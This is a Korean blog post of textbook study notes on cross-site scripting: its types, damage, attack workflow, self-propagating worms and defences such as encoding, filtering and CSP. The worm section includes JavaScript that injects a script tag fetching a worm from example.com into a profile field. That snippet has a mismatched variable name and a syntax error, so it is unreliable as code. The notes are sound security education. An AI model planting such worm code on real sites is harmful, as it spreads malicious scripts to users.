---
title: Cross-Site Scripting Attack
tags: XSS Web-Hacking Cybersecurity
key: page-xss_attack
categories: [Cybersecurity, Web Security]
author: hyoeun
math: true
mathjax_autoNumber: true
---

## The Cross-Site Scripting Attack
* Attacker가 victim's browser에 code를 inject시키면 공격을 할 수 있는데 victim이 attacker의 page에 접속할때마다 그 공격이 이루어질 수 있는 것이다. 하지만 sandbox protection 때문에 그 공격이 이루어지지 않는다.
* 하지만 target page에 공격 코드를 inject시키면 공격을 성공시킬 수 있는데 이것을 cross-site scripting(xss) attack이라고 부르는 것이다.
* 기본적으로 어떤 웹사이트에서 온 코드는 그 웹사이트에 관해서는 다 신뢰하고 실행하게 된다. 따라서 이 공격을 통해 그 웹사이트와 연관된 쿠키를 수정하거나 또 다른 리퀘스트를 날리거나 뭐든지 할 수 있는것이다. 특히 active session을 가지고 있으면 어떠한 것도 그 웹사이트 안에서는 다 허용한다.
* 따라서 공격자가 target website에 코드를 심어서 공격을 하는 것이다.
<br><br>

## Persistent(Stored) XSS Attack
* 악성 스크립트가 포함된 User input이 타겟 서버에 페이로드로써 저장되어 그 페이로드가 포함된 애플리케이션 부분에 액세스 하는 모든 사람이 악성 스크립트를 트리거 하게 되는 공격입니다.
* 예를들어 공격자가 자신의 프로필 수정란에 script code를 기입하고 그것을 db에 저장시킨다음 다른 사람들이 그 프로필을 보게 되면 injecte된 script code를 보게 되면서 그것을 실행하게 된다. 이것은 서버측에서 data로 저장할때 HTML markup을 제대로 sanitized하지 않았기 때문에 생기는 허점이다.
* 브라우저는 이러한 코드들을 서버에서 만든건지 다른 사람이 만든건지 구별할 수 없기 때문에 그 코드를 user의 privilege로 실행시켜버린다.
<br><br>

## Non-persistent(Reflected) XSS Attack
* 웹 애플리케이션이 request에 포함된 user input을 안전하게 sanitize를 하지 않고 악성 스크립트가 있는 채로 response를 해 악성 스크립트가 클라이언트에서 실행되는 공격기법이다.
* 주로 사용자에게 악성 URL을 배포하여 사용자가 그것을 클릭하도록 유도하여 클릭한 사용자의 브라우저에서 악성 스크립트가 실행되도록 한다.
<br><br>

## Dom-based XSS
* 공격자가 DOM에 페이로드를 주입해서 피해자의 브라우저가 HTML 페이지를 로드 할 때마다 악성 스크립트가 DOM 생성의 일부로 실행되면서 공격하는 기법이다. 페이지 자체는 변하지 않으나, 페이지에 포함되어 있는 브라우저측 코드가 DOM 환경에서 악성코드로 실행된다.
* 앞선 타입과는 다르게 서버와 관계없이 브라우저에서 발생하는 것이 차이점이다.
<br><br>

## What damage can XSS cause?
* Web defacing: JS code는 DOM APIs를 쓸 수 있기 때문에 hosting page의 DOM을 생산 혹은 제거, 변경 같은 것을 가능하게 하여 fake page를 만들수도 있고 형태 자체를 바꿔버릴 수 있다.
* Spoofing requests: JS code는 HTTP request도 가능하기 때문에 우리가 지금까지 얘기한것들의 예들로 fake user로 접근하여 서버에 fake user신분으로 의도치 않은 일들을 할 수 있다.
* Stealing information: Victim's private data(session cookie, 개인 정보 등)를 공격자에게로 쉽게 보낼 수 있다.
<br><br>

## XSS Attacks in Action
* 공격에 앞서 우선 target website가 어떤식으로 작동하는지를 우리가 코드를 심고자 하는 행위를 실행했을 때 HTTP header를 분석하면서 url 같은 것을 확인하고 이용한다.
* 공격할때는 스펠링 하나하나 잘 확인해야하고 target site마다 가지는 특성에 따라 공격 코드가 다 달라지기 때문에 정형화한 방식을 알려주기는 힘들다.
* 분석한 액션에 대한 url 분석만 잘 마치면 그 url의 패턴들에 따라 내용만 잘 넣어서 Ajax로 open(), setRequestHeader(), send()와 같은 함수들을 잘만 사용하면 공격에 성공할 수 있을 것이다.
<br><br>

## Achieving Self-Propagation
* 진짜 worm처럼 자가번식하면서 malware code를 퍼트리려면 DOM APIs를 통한 방식과 src attribute를 이용하여 link로 퍼트리는 방식이 있다.
### DOM Approach
* 웹 페이지가 만들어질때에는 브라우저측에서 Document Object Model(DOM)을 생성한다.
* DOM은 각 페이지의 내용들을 DOM nodes형태로 tree를 구성한다.
* 이 방식으로 공격할때에는 우리는 JS code를 DOM API를 통해 node 이름(id)을 부여하고 document.getElementByID()를 통해 그 노드를 불러오기만 하면 공격할 수 있다. 별거 없고 그냥 API 쓰면 DOM 접근 방식인거다. 코드를 다시 쓰는게 아니라 elegance하게 DOM API로 불러서 그 전체 코드를 content에 실어서 보내면 된다.
    ```javascript
    <script id="worm">

    // Use DOM API to get a copy of the content in a DOM node.
    var strCode = document.getElementById("worm").innerHTML;

    // Displays the tag content
    alert(strCode);

    </script>
    ```
### Link Approach
* 이거는 js파일을 그대로 불러서 src에다가 넣는것이다.
    ```javascript
    var warmCode = encodeURIComponent(
        "<script type=\"text/javascript\" "
        + "src=\"http://example.com/xss_worm.js\">";
        + "</" + "script>");

    // Set the content for the description field(이거는 특정 웹사이트에서 적용하는 방식을 이용한 것일뿐.)
    var desc="&description=SAMY is MY HERO" + wormCode;

    //(the rest of the code is the same as that in the previous approach)
    ..
    ```
* 위의 방식으로 js 파일(worm)을 넣기만 하면 된다.
* 위에서 </ script> 부분을 따로 스트링 처리 하는 이유는 만약 한 곳에 처리해버리면 firefox같은 브라우저는 하나로 인식해서 제대로 코드 전달이 안되기 때문이다. 브라우저 파싱 방식에 따라 달라질 것이다.
<br><br>

## Preventing XSS attacks
* XSS가 생기는 이유는 data와 code를 분리하지 않아서이다.
* 하지만 HTML markup을 지원하는 입장에서 분리하는게 결코 쉬운일은 아니다.
* user input으로 부터 코드를 없애거나 가능하면 그것을 ineffective하게 바꾸는 2가지의 방식이 있다. 보통 아래 2가지 방법을 섞어서 XSS를 예방한다.
* IPS, IDS, 방화벽으로도 방지할 수 없기 때문에 단순히 문자를 필터링 하는 것과 같은 방법만이 존재한다.

### Filter Approach
* user input으로 부터 코드를 지운다는 것인데 이게 쉽지 않다.
* script 태그 외에 여러가지 방법으로 javascript를 작동시킬 수 있는 방법들이 존재한다.
* 이건 만드는게 쉽지 않기 때문에 jsoup와 같은 오픈소스 코드를 사용해도 좋다.

### Encoding Approach
* Code들을 브라우저가 볼 수 있는 방식(\&\lt; 같이 < 대신에 보여지는 방식)으로 바꾸는 것이다.
* 브라우저가 representations하는 방식이 된다는 것은 코드는 실행되지 않는다는 것을 의미한다.

### 생각해볼 문제
* 위 방식들을 사용할 경우 white list가 나을것인가 black list가 나을 것인가?
* 경우에 따라 각각 다르겠지만 white list가 일반적으로 작성하기 쉽고(알파벳과 숫자 혹은 특수문자 몇개 정도만 허용하게 하면 된다.) 사용자가 예상 범위 안에서 사용할 수 있게 만들 수 있어서 좀 더 나을 수 있다.

### Content Security Policy(CSP) 사용
* 스크립트 실행에 대한 정책을 설정해 예방하는 방법. 어떤 웹 리소스만 허용할지 정의.
* 출처가 자기 서버인 스크립트만 실행 될 수 있도록 한다.  

## Refrence
* [COMPUTER SECURITY: A Hands-on Approach by Wenliang Du](https://www.amazon.com/Computer-Security-Hands-Approach-Wenliang/dp/154836794X)
* [설명이 풍부한 자료](https://excess-xss.com/)